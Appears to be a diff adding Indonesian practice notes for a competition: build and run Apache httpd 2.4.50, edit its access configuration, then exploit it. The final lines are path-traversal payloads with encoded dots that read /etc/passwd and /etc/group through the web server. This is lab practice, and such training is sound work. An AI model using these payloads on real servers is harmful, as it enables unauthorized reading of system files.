@@ -1,0 +1,56 @@
+ifconfig 
+netstat -antlp = meliat ip localhost 
+which apache2 
+service apache2 start 
+apt-get update
+apt-get install wget curl make gcc perl -y
+apt-get install libapr1-dev libaprutil1-dev libpcre3-dev -y
+mkdir apache = membuat folder bebas 
+cd apache2/
+wget https://archive.apache.org/dist/httpd/httpd-2.4.50.tar.gz = ini http nya akan di umumkan pas lomba 
+ls
+tar -xf httpd-2.4.50.tar.gz = ini versinya akan ada pada hari H jadi nanti diganti versinya 
+ls
+cd httpd-2.4.50
+ls
+./configure --prefix=/usr/local/apache
+make 
+make install
+cd /usr/local/
+cd /usr/local/apache/
+ls
+ifconfig
+ 
+lakukan pengetesan pada web dengan memanggil IP 
+ls
+cd bin/
+apachectl -k start 
+cd 
+ls
+/usr/local/apache/bin/apachectl -k start 
+ifconfig 
+netstat -antlp
+coba refresh di website dan tuliskan http://ip 
+cd usr/local/apache
+cd htdocs 
+ls
+nano index.html 
+edit tampilan websitenya 
+cd ..
+ls
+cd conf 
+nano http.conf 
+cari yang reuired all denied 
+/usr/local/apache/bin/apachecctl -k stop
+netstat -antlp
+ls
+cat httpd.conf| xclip -selection clipboard 
+nano httpd.conf 
+/usr/local/apache/bin/apachectl -k start 
+netstat -atnlp
+lakukan pengujian pada web lagu dengan menempel ip 
+/icons/.%%32%65/.%%32%65/.%%32%65/.%%32%65/etc/passwd
+bawa payloadnya ke tampilan website dan tempel
+/icons/.%%32%65/.%%32%65/.%%32%65/.%%32%65/etc/group
+
+
